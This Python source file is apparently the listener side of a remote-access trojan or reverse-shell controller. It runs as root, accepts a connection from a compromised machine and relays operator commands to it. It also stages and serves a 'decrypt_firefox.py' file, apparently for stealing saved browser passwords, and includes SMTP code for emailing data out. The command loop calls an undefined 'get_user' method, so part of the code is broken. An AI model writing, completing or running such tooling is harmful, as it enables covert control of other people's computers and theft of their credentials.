#!/usr/bin/env python3

import socket
import shutil
import signal
import sys
import subprocess
import smtplib
import os
import tempfile
from email.mime.text import MIMEText
from termcolor import colored

def def_handler(sig, frame):
    print(colored(f"\n\n[!] Leaving the program...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# root?
if os.geteuid() != 0:
    print(colored("\n[!] You need to be root\n", 'red'))
    sys.exit(1)

class Listener:

    def __init__(self, ip, port):
        self.ip = ip
        self.options = {"help": "Show this help panel"}
        self.server_process = None

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((ip, port))
        server_socket.listen()

        print(colored(f"\n[+] Listening for incoming connections...\n", 'green'))

        self.client_socket, client_address = server_socket.accept()

        print(colored(f"\n[+] Connection established by {client_address}\n", 'yellow'))

    def command_remotely(self, command):
        self.client_socket.send(command.encode())
        return self.client_socket.recv(2048).strip().decode('cp850')

    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())

        print(colored(f"\n[+] Emails sent successfully!!\n", 'green'))

    
    def help_panel(self):
        donde = self.command_remotely("cd")
        print(donde)
        for key, value in self.options.items():
            print(f"\n{key} - {value}\n")

    def check_path(self):
        directory = tempfile.mkdtemp(prefix="Python-Server-")
        print(colored(f"Temporary directory '{directory}' created.\n", 'yellow'))
        try:
            file_to_copy = "decrypt_firefox.py"
            current_directory = os.getcwd()
            source_file_path = os.path.join(current_directory, file_to_copy)
            destination_file_path = os.path.join(directory, file_to_copy)
            shutil.copy(source_file_path, destination_file_path)
        except Exception as e:
            print(colored(f"Error al copiar el archivo: {e}", 'red'))
        return directory

    def start_local_http_server(self, directory):
        try:
            self.server_process = subprocess.Popen(["python3", "-m", "http.server", "80", "-d", directory], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print(colored("[+] HTTP Server started successfully", 'green'))
        except Exception as e:
            print(colored(f"\n[!] Error, you need to check if you have any services on port 80: {e}\n", 'red'))

    def stop_local_http_server(self):
        if self.server_process:
            self.server_process.terminate()
            print(colored("[+] HTTP Server stopped successfully", 'green'))

    
    def run(self):
        while True:
            command = input(colored(">> ", 'green'))
            if command == "get users":
                self.get_user(command)
            elif command == "help":
                self.help_panel()
            else:
                command_output = self.command_remotely(command)
                print(command_output)
